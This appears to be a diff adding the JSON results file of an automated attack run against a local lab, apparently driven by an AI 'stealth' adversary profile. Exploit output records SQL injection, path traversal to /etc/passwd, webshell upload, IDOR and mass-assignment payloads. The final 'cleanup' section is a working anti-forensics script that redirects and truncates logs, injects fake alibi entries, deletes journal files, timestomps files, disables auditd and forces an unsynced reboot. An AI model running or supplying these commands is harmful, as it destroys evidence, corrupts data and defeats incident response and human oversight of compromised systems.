@@ -1,0 +1,99 @@
+{
+  "target": "vulnu-lab (localhost)",
+  "timestamp": 1783198090.285536,
+  "services": {
+    "www": {
+      "alive": true,
+      "port": 8080,
+      "exploits": [
+        {
+          "script": "exploit_sqli_login.py",
+          "status": "PASS",
+          "stdout": "[FAIL] PHP www @ http://localhost:8080/login.php -- single quote (no success)\n[FAIL] PHP www @ http://localhost:8080/login.php -- admin comment (no success)\n[FAIL] PHP www @ http://localhost:8080/login.php -- union admin (no success)\n[PASS] Flask www @ http://localhost:8080/login -- single quote\n[PASS] Flask www @ http://localhost:8080/login -- admin comment\n[FAIL] Flask www @ http://localhost:8080/login -- union admin (no success)\n\n[RESULT] 2/6 passed\n",
+          "stderr": ""
+        },
+        {
+          "script": "exploit_sqli_search.py",
+          "status": "PASS",
+          "stdout": "[INFO] PHP www -- ?q=admin: <!doctype html>\n<html lang=en>\n<title>404 Not Found</title>\n<h1>Not Found</h1>\n<p>The requested URL \n[INFO] PHP www -- ?q=' OR '1'='1: <!doctype html>\n<html lang=en>\n<title>404 Not Found</title>\n<h1>Not Found</h1>\n<p>The requested URL \n[INFO] PHP www -- ?q=' UNION SELECT username FROM users --: <!doctype html>\n<html lang=en>\n<title>404 Not Found</title>\n<h1>Not Found</h1>\n<p>The requested URL \n[PASS] Flask www -- ?q=admin (data extracted)\n[INFO] Flask www -- ?q=' OR '1'='1: <h2>Search results for: ' OR '1'='1</h2><p>No products found.</p>\n[INFO] Flask www -- ?q=' UNION SELECT username FROM users --: <h2>Search results for: ' UNION SELECT username FROM users --</h2><p>No products found.</p>\n",
+          "stderr": ""
+        },
+        {
+          "script": "exploit_lfi.py",
+          "status": "MIXED",
+          "stdout": "[FAIL] PHP www -- /etc/passwd (no expected content)\n[FAIL] PHP www -- ../../../etc/passwd (no expected content)\n[FAIL] PHP www -- ../../../../../../etc/passwd (no expected content)\n[FAIL] PHP www -- db_backup.sql (no expected content)\n[FAIL] Flask www -- /etc/passwd (no expected content)\n[FAIL] Flask www -- ../../../etc/passwd (no expected content)\n[FAIL] Flask www -- ../../../../../../etc/passwd (no expected content)\n[FAIL] Flask www -- db_backup.sql (no expected content)\n",
+          "stderr": ""
+        },
+        {
+          "script": "exploit_upload_webshell.py",
+          "status": "MIXED",
+          "stdout": "[FAIL] PHP www -- upload failed: <!doctype html>\n<html lang=en>\n<title>404 Not Found</title>\n<h1>Not Found</h1>\n<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try agai\n[FAIL] Flask www -- upload failed: <!doctype html>\n<html lang=en>\n<title>404 Not Found</title>\n<h1>Not Found</h1>\n<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try agai\n",
+          "stderr": ""
+        }
+      ],
+      "summary": "2/4 passed, 2/4 mixed"
+    },
+    "www-flask": {
+      "alive": true,
+      "port": 8081,
+      "exploits": [
+        {
+          "script": "exploit_sqli_login.py",
+          "status": "PASS",
+          "stdout": "[FAIL] PHP www @ http://localhost:8081/login.php -- single quote (no success)\n[FAIL] PHP www @ http://localhost:8081/login.php -- admin comment (no success)\n[FAIL] PHP www @ http://localhost:8081/login.php -- union admin (no success)\n[PASS] Flask www @ http://localhost:8081/login -- single quote\n[PASS] Flask www @ http://localhost:8081/login -- admin comment\n[FAIL] Flask www @ http://localhost:8081/login -- union admin (no success)\n\n[RESULT] 2/6 passed\n",
+          "stderr": ""
+        },
+        {
+          "script": "exploit_sqli_search.py",
+          "status": "PASS",
+          "stdout": "[INFO] PHP www -- ?q=admin: <!doctype html>\n<html lang=en>\n<title>404 Not Found</title>\n<h1>Not Found</h1>\n<p>The requested URL \n[INFO] PHP www -- ?q=' OR '1'='1: <!doctype html>\n<html lang=en>\n<title>404 Not Found</title>\n<h1>Not Found</h1>\n<p>The requested URL \n[INFO] PHP www -- ?q=' UNION SELECT username FROM users --: <!doctype html>\n<html lang=en>\n<title>404 Not Found</title>\n<h1>Not Found</h1>\n<p>The requested URL \n[PASS] Flask www -- ?q=admin (data extracted)\n[PASS] Flask www -- ?q=' OR '1'='1 (data extracted)\n[PASS] Flask www -- ?q=' UNION SELECT username FROM users -- (data extracted)\n",
+          "stderr": ""
+        },
+        {
+          "script": "exploit_lfi.py",
+          "status": "PASS",
+          "stdout": "[FAIL] PHP www -- /etc/passwd (no expected content)\n[FAIL] PHP www -- ../../../etc/passwd (no expected content)\n[FAIL] PHP www -- ../../../../../../etc/passwd (no expected content)\n[FAIL] PHP www -- db_backup.sql (no expected content)\n[PASS] Flask www -- /etc/passwd (content found)\n[PASS] Flask www -- ../../../etc/passwd (content found)\n[PASS] Flask www -- ../../../../../../etc/passwd (content found)\n[FAIL] Flask www -- db_backup.sql (no expected content)\n",
+          "stderr": ""
+        },
+        {
+          "script": "exploit_upload_webshell.py",
+          "status": "PASS",
+          "stdout": "[FAIL] PHP www -- upload failed: <!doctype html>\n<html lang=en>\n<title>404 Not Found</title>\n<h1>Not Found</h1>\n<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try agai\n[PASS] Flask www -- upload succeeded\n",
+          "stderr": ""
+        }
+      ],
+      "summary": "4/4 passed, 0/4 mixed"
+    },
+    "ums": {
+      "alive": true,
+      "port": 8082,
+      "exploits": [
+        {
+          "script": "exploit_idor.py",
+          "status": "MIXED",
+          "stdout": "[*] Testing IDOR\n\n[INFO] ID 102: Alice (grade: 85)\n[INFO] ID 103: Bob (grade: 90)\n[INFO] ID 104: Alice (grade: 85)\n[INFO] ID 1: Alice (grade: 85)\n[INFO] ID 0: Alice (grade: 85)\n[INFO] ID -1: Alice (grade: 85)\n[INFO] ID 999: Alice (grade: 85)\n",
+          "stderr": ""
+        },
+        {
+          "script": "exploit_mass_assignment.py",
+          "status": "PASS",
+          "stdout": "[*] Testing Mass Assignment\n\n[INFO] Payload 1: {'status': 'success', 'updated': {'email': 'hacker@test.com', 'name': 'attacker'}}\n[PASS] Payload 2: extra fields accepted -- {'role': 'admin', 'is_admin': True}\n[PASS] Payload 3: extra fields accepted -- {'role': 'admin', 'balance': 99999, 'credit_card': '4111-1111-1111-1111'}\n",
+          "stderr": ""
+        }
+      ],
+      "summary": "1/2 passed, 1/2 mixed"
+    },
+    "nertu": {
+      "alive": false,
+      "exploits": []
+    }
+  },
+  "phases": {
+    "cleanup": {
+      "model": "anti_forensics_module",
+      "output": "# === FULL CLEANUP CHAIN ===\n\n# Phase 1: Oracle/MSSQL audit suppression (do first \u2014 before data extraction)\n\n# Phase 2: Tomcat cleanup\n# Tomcat \u2014 Poison JSP compilation cache with benign-looking compiled class\nfind /var/lib/tomcat*/work -name '*.class' -path '*_jsp*' -exec touch -r /usr/share/tomcat/lib/catalina.jar {} \\; 2>/dev/null\n# Redirect catalina.out to /dev/null via log4j config injection\nsed -i 's|catalina.out|/dev/null|g' /var/lib/tomcat*/conf/logging.properties 2>/dev/null || echo 'logging.properties not found'\n# Clear manager and host-manager access logs\nfor f in /var/log/tomcat*/manager* /var/log/tomcat*/host-manager*; do : > \"$f\" && chattr +i \"$f\" 2>/dev/null; done\n# Remove JSP compilation artifacts from work directory\nrm -rf /var/lib/tomcat*/work/Catalina/localhost/_/org/apache/jsp/* 2>/dev/null; echo 'JSP cache cleared'\n\n# Phase 3: CentOS/Apache cleanup\n# CentOS/Apache \u2014 Timestamped log injection (insert alibi entries)\necho '192.168.1.100 - - [$(date -d \"-3 days\" +\"%d/%b/%Y:%H:%M:%S\" +%z)] \"GET / HTTP/1.1\" 200 123 \"-\" \"Mozilla/5.0\"' >> /var/log/httpd/access_log\n# Inject synthetic entries BEFORE real activity to complicate timeline\nfor i in $(seq 1 50); do echo \"10.0.0.$((RANDOM % 255)) - admin [$(date -d \"-$i hours\" +\"%d/%b/%Y:%H:%M:%S\") +0530] \\\"POST /login HTTP/1.1\\\" 200 456 \\\"-\\\" \\\"Mozilla/5.0\\\"\" >> /var/log/httpd/access_log; done\n# Corrupt specific journal files (looks like filesystem error)\njournalctl --rotate && journalctl --vacuum-time=1s 2>/dev/null; rm -f /var/log/journal/*/system@*.journal 2>/dev/null\n# Timestomp modified files to match existing system files\ntouch -r /bin/ls /var/log/httpd/access_log 2>/dev/null\n# Disable auditd logging for the session (if root)\nauditctl -e 0 2>/dev/null || echo 'auditctl not available'\n\n\n# Phase 5: Kill switch \u2014 instant reboot with no sync\necho 1 > /proc/sys/kernel/sysrq 2>/dev/null\necho b > /proc/sysrq-trigger 2>/dev/null  # instant reboot, no disk sync"
+    }
+  },
+  "adversary_profile": "stealth",
+  "summary": "7/10 passed"
+}
